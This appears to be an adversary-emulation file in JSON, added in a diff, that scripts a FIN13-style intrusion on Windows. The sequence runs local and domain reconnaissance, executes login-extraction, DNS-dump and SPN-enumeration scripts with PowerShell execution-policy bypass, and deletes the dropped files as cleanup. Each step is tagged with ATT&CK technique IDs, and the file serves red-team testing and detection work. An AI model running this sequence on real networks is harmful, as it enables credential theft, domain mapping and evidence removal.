@@ -1,0 +1,340 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "FIN13 is a financially motivated threat actor tracked by Mandiant and known to target Mexican organizations with passive backdoors.\n\nhttps://www.mandiant.com/resources/fin13-cybercriminal-mexico",
+        "display_name": "FIN13",
+        "name": "FIN13",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 127.0.0.1:443 --multipart 10240 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "2": {
+                "module": "loader",
+                "module_to_load": "uploader",
+                "request": "--load uploader",
+                "type": "message"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "4": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "LOCAL RECON"
+            },
+            "5": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "whoami",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "systeminfo",
+                "rtags": [
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "fsutil fsinfo drives",
+                "rtags": [
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c dir .\\\\",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0007",
+                    "att&ck-technique:T1083",
+                    "att&ck-technique:T1059",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "attrib /D",
+                "rtags": [
+                    "att&ck-technique:T1083"
+                ],
+                "type": "message"
+            },
+            "10": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net user",
+                "rtags": [
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net localgroup",
+                "rtags": [
+                    "att&ck-technique:T1069.001"
+                ],
+                "type": "message"
+            },
+            "12": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net accounts",
+                "rtags": [
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "13": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS:/shared/threats/FIN13/ExtractLogins.ps1 --dest %TEMP%\\ExtractLogins.ps1",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "14": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell -exec bypass %TEMP%\\ExtractLogins.ps1",
+                "rtags": [
+                    "att&ck-technique:T1059.001",
+                    "att&ck-technique:T1033"
+                ],
+                "type": "message"
+            },
+            "15": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS:/shared/threats/FIN13/DNSDump.ps1 --dest %TEMP%\\DNSDump.ps1",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "16": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell -exec bypass %TEMP%\\DNSDump.ps1",
+                "rtags": [
+                    "att&ck-technique:T1546.013",
+                    "att&ck-technique:T1018"
+                ],
+                "type": "message"
+            },
+            "17": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "NETWORK RECON"
+            },
+            "18": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "ipconfig /all",
+                "rtags": [
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "19": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "netstat -ano",
+                "rtags": [
+                    "att&ck-technique:T1049"
+                ],
+                "type": "message"
+            },
+            "20": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c echo %USERDOMAIN%",
+                "rtags": [
+                    "att&ck-technique:T1016",
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1059"
+                ],
+                "type": "message"
+            },
+            "21": {
+                "function": "ifelse",
+                "next": "31",
+                "step": "20",
+                "type": "decision",
+                "value": "\"The system cannot find the file specified.\"",
+                "verb": "contains"
+            },
+            "22": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net user /domain",
+                "rtags": [
+                    "att&ck-technique:T1087.002",
+                    "att&ck-technique:T1087"
+                ],
+                "type": "message"
+            },
+            "23": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "net group /domain",
+                "rtags": [
+                    "att&ck-technique:T1087.002",
+                    "att&ck-technique:T1087"
+                ],
+                "type": "message"
+            },
+            "24": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c echo %LOGONSERVER%",
+                "rtags": [
+                    "att&ck-technique:T1059",
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1018"
+                ],
+                "type": "message"
+            },
+            "25": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c echo %USERDNSDOMAIN%",
+                "rtags": [
+                    "att&ck-technique:T1059",
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1016"
+                ],
+                "type": "message"
+            },
+            "26": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "nslookup $(24).response[\"result\"].strip(\"\\\\\").strip(\"\\r\\n\").suffix(\".\")$(25).response[\"result\"].strip(\"\\r\\n\")",
+                "rtags": [
+                    "att&ck-technique:T1018"
+                ],
+                "type": "message"
+            },
+            "27": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "ping -n 1 $(24).response[\"result\"].strip(\"\\\\\").strip(\"\\r\\n\").suffix(\".\")$(25).response[\"result\"].strip(\"\\r\\n\")",
+                "rtags": [
+                    "att&ck-technique:T1018"
+                ],
+                "type": "message"
+            },
+            "28": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "tracert $(24).response[\"result\"].strip(\"\\\\\").strip(\"\\r\\n\").suffix(\".\")$(25).response[\"result\"].strip(\"\\r\\n\")",
+                "rtags": [
+                    "att&ck-technique:T1018"
+                ],
+                "type": "message"
+            },
+            "29": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src VFS:/shared/threats/FIN13/GetUserSPNs.vbs --dest %TEMP%\\GetUserSPNs.vbs",
+                "rtags": [
+                    "att&ck-technique:T1105"
+                ],
+                "type": "message"
+            },
+            "30": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cscript %TEMP%\\GetUserSPNs.vbs",
+                "rtags": [
+                    "att&ck-technique:T1059.005",
+                    "att&ck-technique:T1059",
+                    "att&ck-technique:T1087",
+                    "att&ck-technique:T1087.002"
+                ],
+                "type": "message"
+            },
+            "31": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "CLEANUP"
+            },
+            "32": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del %TEMP%\\ExtractLogins.ps1",
+                "rtags": [
+                    "att&ck-technique:T1070",
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1059"
+                ],
+                "type": "message"
+            },
+            "33": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del %TEMP%\\logs1.txt",
+                "rtags": [
+                    "att&ck-technique:T1070",
+                    "att&ck-technique:T1059",
+                    "att&ck-technique:T1059.003"
+                ],
+                "type": "message"
+            },
+            "34": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del %TEMP%\\DNSDump.ps1",
+                "rtags": [
+                    "att&ck-technique:T1070",
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1059"
+                ],
+                "type": "message"
+            },
+            "35": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd /c del %TEMP%\\addcat.csv",
+                "rtags": [
+                    "att&ck-technique:T1070",
+                    "att&ck-technique:T1059.003",
+                    "att&ck-technique:T1059"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
